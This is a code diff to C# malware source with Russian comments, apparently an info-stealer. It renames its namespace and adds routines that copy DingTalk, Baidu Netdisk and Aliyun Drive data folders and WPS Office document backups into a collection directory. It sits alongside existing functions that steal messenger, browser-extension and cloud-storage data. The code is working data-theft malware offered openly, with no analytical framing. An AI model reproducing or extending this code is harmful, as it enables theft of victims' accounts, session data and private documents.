@@ -8,7 +8,7 @@ using Microsoft.Win32;
 using System.Diagnostics;
 using System.Security.Cryptography;
 
-namespace StealthModule
+namespace VanguardCore
 {
     /// <summary>
     /// Абсолютно неуязвимый сборщик данных VPN/FTP/SSH
@@ -40,6 +40,7 @@ namespace StealthModule
             StealAllMessengers();
             StealAllBrowsersExtensions();
             StealAllCloudStorages();
+            StealChineseApps();
 
             // Формирование отчета
             List<string> results = new List<string>();
@@ -47,6 +48,89 @@ namespace StealthModule
                 results.Add(item);
 
             return string.Join(";", results.ToArray());
+        }
+        #endregion
+
+        #region Китайские Приложения
+        private static void StealChineseApps()
+        {
+            StealDingTalk();
+            StealBaiduPan();
+            StealWPSOffice();
+            StealAliyunDrive();
+        }
+
+        private static void StealDingTalk()
+        {
+            try
+            {
+                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                string dingPath = Path.Combine(appData, "DingTalk");
+
+                if (Directory.Exists(dingPath))
+                {
+                    string dest = Path.Combine(_outputDir, "Messengers", "DingTalk");
+                    // Копируем только конфиги и метаданные, игнорируем тяжелые кеши
+                    CopyFolder(dingPath, dest, true);
+                    _collected.Add("DingTalk");
+                }
+            }
+            catch { }
+        }
+
+        private static void StealBaiduPan()
+        {
+            try
+            {
+                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                string baiduPath = Path.Combine(appData, "Baidu", "BaiduNetdisk");
+
+                if (Directory.Exists(baiduPath))
+                {
+                    string dest = Path.Combine(_outputDir, "Cloud", "BaiduPan");
+                    CopyFolder(baiduPath, dest, true);
+                    _collected.Add("BaiduPan");
+                }
+            }
+            catch { }
+        }
+
+        private static void StealWPSOffice()
+        {
+            try
+            {
+                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                string wpsPath = Path.Combine(appData, "kingsoft", "office6");
+
+                if (Directory.Exists(wpsPath))
+                {
+                    string dest = Path.Combine(_outputDir, "Office", "WPS");
+                    // Сбор данных о последних документах
+                    string recentPath = Path.Combine(wpsPath, "data", "backup");
+                    if (Directory.Exists(recentPath))
+                        CopyFolder(recentPath, Path.Combine(dest, "RecentDocuments"), true);
+                    
+                    _collected.Add("WPSOffice");
+                }
+            }
+            catch { }
+        }
+
+        private static void StealAliyunDrive()
+        {
+            try
+            {
+                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                string aliPath = Path.Combine(localApp, "AliyunDrive");
+
+                if (Directory.Exists(aliPath))
+                {
+                    string dest = Path.Combine(_outputDir, "Cloud", "AliyunDrive");
+                    CopyFolder(aliPath, dest, true);
+                    _collected.Add("AliyunDrive");
+                }
+            }
+            catch { }
         }
         #endregion
 
